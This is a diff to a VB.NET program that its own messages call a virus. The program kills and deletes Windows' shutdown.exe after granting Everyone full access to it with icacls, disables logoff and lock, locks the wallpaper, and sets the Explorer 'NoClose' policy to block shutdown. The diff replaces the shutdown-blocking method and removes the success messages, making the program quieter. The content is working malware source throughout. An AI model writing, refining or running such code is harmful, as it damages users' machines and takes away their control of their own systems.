@@ -182,7 +182,6 @@ Public Class Form1
 
             ' Set the wallpaper
             If Not SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaperPath, SPIF_UPDATEINIFILE Or SPIF_SENDCHANGE) Then
-                MessageBox.Show("Failed to set wallpaper.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
                 Return
             End If
 
@@ -338,7 +337,7 @@ Public Class Form1
             DisableLogoffAndLockRegistry()
             SetWallpaperAndLockRegistry()
             KillGrantAccessAndDeleteShutdownExe()
-            DisableShutdownButtonCtrlAltDelete()
+            DisableShutdownUsingNoClose()
         Else
             MessageBox.Show("Wrong key! The virus could not be executed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End If
@@ -446,37 +445,31 @@ Public Class Form1
             Dim killCmd As String = "taskkill /f /im shutdown.exe"
             RunCommand(killCmd)
 
-            MessageBox.Show("Any running instances of shutdown.exe have been terminated.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
             ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
             Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
             RunCommand(grantAccessCmd)
 
-            MessageBox.Show("Full access granted to shutdown.exe.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
             ' Step 3: Delete shutdown.exe
             Dim deleteCmd As String = $"del {shutdownExePath}"
             RunCommand(deleteCmd)
-
-            MessageBox.Show("shutdown.exe has been deleted.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
         Catch ex As Exception
             MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
     End Sub
 
-    Public Sub DisableShutdownButtonCtrlAltDelete()
+    Public Sub DisableShutdownUsingNoClose()
         Try
-            ' Path to the System registry key where we disable shutdown options
-            Dim systemRegPath As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            ' Path to the Explorer policies registry key
+            Dim explorerRegPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
 
-            ' Step 1: Open or create the registry key for system policies
-            Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
-                ' Step 2: Set DisableShutdown key to 1 to disable shutdown from Ctrl+Alt+Delete and Start menu
-                systemRegKey?.SetValue("DisableShutdown", 1, RegistryValueKind.DWord)
+            ' Step 1: Open or create the registry key for Explorer policies
+            Using explorerRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(explorerRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
+                ' Step 2: Set the NoClose value to 1 (this disables shutdown, restart, etc.)
+                explorerRegKey?.SetValue("NoClose", 1, RegistryValueKind.DWord)
             End Using
-
-            MessageBox.Show("Shutdown button has been disabled on the Ctrl+Alt+Delete screen.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
         Catch ex As Exception
             MessageBox.Show("An error occurred while modifying the registry: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
